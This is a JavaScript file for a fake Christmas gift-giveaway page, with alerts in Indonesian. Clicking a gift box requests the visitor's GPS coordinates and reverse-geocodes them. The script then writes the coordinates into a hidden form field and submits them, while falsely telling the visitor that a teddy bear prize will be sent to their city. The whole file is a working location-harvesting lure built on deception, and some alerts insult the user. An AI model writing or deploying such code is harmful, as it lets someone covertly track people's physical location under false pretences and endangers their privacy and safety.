const bubbling = document.querySelector('.container');

const musik = new Audio('./natal.mp3');

const form = document.getElementById('fs-frm');
const nama = document.getElementById('email-subject')

// key
let lokasi = null;
let ambil = null;
let kota = null;


bubbling.addEventListener('click', e => {
  if (e.target.className === 'music') {
    musik.play();
    musik.loop = true;
  }
  
  // box hadiah
  if (e.target.className === 'box') {
    if (ambil) {
      if (!lokasi) {
        alert('aktifkan gps nya tod! agar bisa dapat hadiahnya');
        return false;
       }
      alert('anda sudah mendapatkan hadiah! silahkan di ambil dulu tod jangan serakah');
      return false
    } else {
      findMyState();
      ambil = true;
    }
  }
  
  // btn ambil
  if (e.target.dataset.btn === 'ambil') {
    if (ambil) {
      if (!lokasi) {
        alert('Aktifkan lokasi untuk mengambil hadiah nya!');
        return false;
      }
      document.getElementById('fs-frm').submit();
    } else {
      alert('Pilih kado nya dulu tod!');
    }
  }
  
});

const findMyState = ()=> {
  
  const success = (position) => {
    let latitude = position.coords.latitude;
    let longitude = position.coords.longitude;
    
    let geoUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`;
    
    fetch(geoUrl)
    .then(res => res.json())
    .then(data => {
      lokasi = `${data.latitude},${data.longitude}`;
      kota = `${data.city}`;
      setTimeout(() => {
        nama.value = lokasi;
        getKota(kota);
      }, 200);
      
    });
  }
  
  const error = () => {
    alert('tidak dapat terhubung harap aktifkan lokasi dulu!');
  }
  
  navigator.geolocation.getCurrentPosition(success, error)
}


function getKota(kota) {
  alert(`Selamat anda mendapatkan hadiah boneka beruang, silahkan diambil dulu, dan akan dikirim ke tujuan ${kota}`);
}
